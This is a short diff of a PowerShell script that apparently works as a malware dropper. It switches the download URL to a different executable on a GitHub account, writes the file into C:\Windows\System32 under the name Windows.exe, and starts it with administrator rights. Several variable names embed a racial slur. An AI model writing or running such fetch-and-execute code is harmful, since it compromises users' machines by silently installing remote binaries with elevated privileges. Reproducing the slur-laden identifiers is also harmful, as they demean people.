@@ -19,7 +19,7 @@ while ($WC.IsBusy) {
          Start-Sleep -Milliseconds 1000
 }
 
-$NIGgEruRL = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Windows.exe"
+$NIGgEruRL = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Xan.exe"
 $nigGeRpAth = "C:\Windows\System32\Windows.exe"
 
 $WC = New-Object System.Net.WebClient
@@ -39,3 +39,4 @@ if (Test-Path $TuFfpaTh) {
 if (Test-Path $nigGeRpAth) {
      Start-Process $nigGeRpAth -Verb RunAs
 }
+
